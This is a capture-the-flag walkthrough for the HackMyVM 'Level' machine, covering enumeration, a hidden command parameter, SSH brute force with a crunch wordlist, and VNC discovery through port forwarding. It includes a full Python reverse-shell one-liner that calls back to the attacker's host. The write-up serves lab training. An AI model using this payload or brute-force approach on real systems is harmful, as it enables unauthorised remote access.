# HackMyVM-Level

<img src="https://imgur.com/cIEzgby.png"/>


## NMAP

```

Nmap scan report for 192.168.1.106                                                                                                           [29/61]
Host is up (0.00037s latency).                                                                                                                      
Not shown: 995 closed ports                                                                                                                         
PORT      STATE SERVICE     VERSION                                                                                                                 
21/tcp    open  ftp         vsftpd 3.0.3                                  
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)                    
| ftp-syst:                                                               
|   STAT:                                                                                                                                           
| FTP server status:                 
|      Connected to ::ffff:192.168.1.8                                    
|      Logged in as ftp              
|      TYPE: ASCII                   
|      No session bandwidth limit                                         
|      Session timeout in seconds is 300                                  
|      Control connection is plain text                                   
|      Data connections will be plain text                                
|      At session startup, client count was 1                             
|      vsFTPd 3.0.3 - secure, fast, stable                                
|_End of status                      
80/tcp    open  http        Apache httpd 2.4.38 ((Debian))                
|_http-server-header: Apache/2.4.38 (Debian)                              
|_http-title: Site doesn't have a title (text/html).                      
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)                                                                             
445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)                                                                          
65000/tcp open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)                                                                          
| ssh-hostkey:                       
|   2048 e0:e7:a1:e4:f8:6f:ce:9f:e5:b8:61:a0:83:e8:e4:77 (RSA)                                                                                      
|   256 69:6a:91:6b:bb:bf:60:55:dc:a3:0b:8f:53:b7:83:7b (ECDSA)                                                                                     
|_  256 8e:92:3d:35:d2:25:4e:e2:f4:1e:21:70:56:56:94:e4 (ED25519)    
MAC Address: 08:00:27:8C:C8:F1 (Oracle VirtualBox virtual NIC)                                                                                [0/61]
Service Info: Host: LEVEL; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel                                                                         

Host script results:                 
|_clock-skew: mean: -20m00s, deviation: 34m38s, median: 0s                
|_nbstat: NetBIOS name: LEVEL, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)                                                            
| smb-os-discovery:                  
|   OS: Windows 6.1 (Samba 4.9.5-Debian)                                  
|   Computer name: level             
|   NetBIOS computer name: LEVEL\x00                                      
|   Domain name: \x00                
|   FQDN: level                      
|_  System time: 2021-01-09T18:41:01+01:00                                
| smb-security-mode:                 
|   account_used: guest              
|   authentication_level: user                                            
|   challenge_response: supported                                         
|_  message_signing: disabled (dangerous, but default)                    
| smb2-security-mode:                
|   2.02:                            
|_    Message signing enabled but not required                            
| smb2-time:                         
|   date: 2021-01-09T17:41:01        
|_  start_date: N/A                  

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                      
Nmap done: 1 IP address (1 host up) scanned in 13.47 seconds              

```

## PORT 21 (FTP)


<img src="https://imgur.com/OwmxsLG.png"/>

There wasn't anything on ftp server.

## PORT 139/445 (SMB)

<img src="https://imgur.com/XmdPiQQ.png"/>

There weren't any share that we could access as anonymous

Running `enum4-linux-ng` I found one user by the name of `one`

<img src="https://imgur.com/IqAvVzs.png"/>

## PORT 80

<img src="https://imgur.com/nEOw8eP.png"/>

Looking at `robots.txt` 

<img src="https://imgur.com/9zc7gMG.png"/>

We saw these directories but they were not on the box but if we scroll down a bit we will find a text written in `brainfuck`

<img src="https://imgur.com/b1F0kss.png"/>

<img src="https://imgur.com/zqVy3jd.png"/>

Visting this directory it will give us a sort of wordlist

<img src="https://imgur.com/OcbIXwK.png"/>

Using this wordlists we found a directorty

<img src="https://imgur.com/39yCl7q.png"/>

But still we need to enumerate more

<img src="https://imgur.com/V7eMfuW.png"/>

I ran the wordlist on directory `Level2021`

<img src="https://imgur.com/LTtLES6.png"/>

<img src="https://imgur.com/NeciiGA.png"/>

But found a static message, I just made a guess about having `cmd` paramter and I was right

<img src="https://imgur.com/SOo2rx3.png"/>

To get a reverse shell I used the python rev shell payload

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.8",2222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

```

<img src="https://imgur.com/GT8j4Zr.png"/>

Then I found a hint in the `/home` directory

<img src="https://imgur.com/6EGgCbw.png"/>

```
################################################
#                                              #
# changing "x" to "number" can be a great idea #
#                                              #
# one:0n30n3xxx                                #
#                                              #
################################################

```
I tried guessing the password with

`0n30n3111` and `0n30n30n3`  but failed.

<img src="https://imgur.com/KKSJOV9.png"/>

I ran linpeas and the only thing I could dig out was the open that was open to only localhost

<img src="https://imgur.com/fR2sN4E.png"/>

So we can do ssh port forwarding but for that we need a valid password for the user `one` so going back to `.one_secret.txt` we may need to craf a wordlist of password with `0n30n3xxx`, where `xxx` will be the random numbers.

<img src="https://imgur.com/veNmj8C.png"/>

I used crunch to make wordlist of the pattern knowing the length of the password which is 9 

<img src="https://imgur.com/UA7JAE9.png"/>

Then use this wordlist to bruteforce against ssh with the user name `one`

<img src="https://imgur.com/Rl3aLC5.png"/>

<img src="https://imgur.com/vzDj3yp.png"/>

<img src="https://imgur.com/QN48Ym0.png"/>

Lets connect to port 5901 with netcat

<img src="https://imgur.com/eBbwqZB.png"/>

Searching this on goolge results in something to do with vnc (virtual networking computing) which is for remote access to a computer similar to windows RDP.

<img src="https://imgur.com/7me5VRY.png"/>

Here `RFB 003.008`  means remote port is a VNC server and up.Now in order to acess this port we need to do ssh port forwarding.

<img src="https://imgur.com/vhh9biO.png"/>

Now if we go to our browser using localhost:5901 we will get this result

<img src="https://imgur.com/L4mPMRI.png"/>

<img src="https://imgur.com/44O3LUN.png"/>

In order to connect to vnc we need a password , by default it is saved in $HOME/.vnc/passwd but in this case it isn't configured to be saved there so we may need to find the password file on the target machine.

<img src="https://imgur.com/lehFgHL.png"/>

In `one`'s directory we can see `...` which is a folder

<img src="https://imgur.com/f44V2la.png"/>

Here `remote_level` is the encrypted password file for connecting to vnc

<img src="https://imgur.com/gNmDGdz.png"/>

<img src="https://imgur.com/XzuUgcv.png"/>

<img src="https://imgur.com/cADOUce.png"/>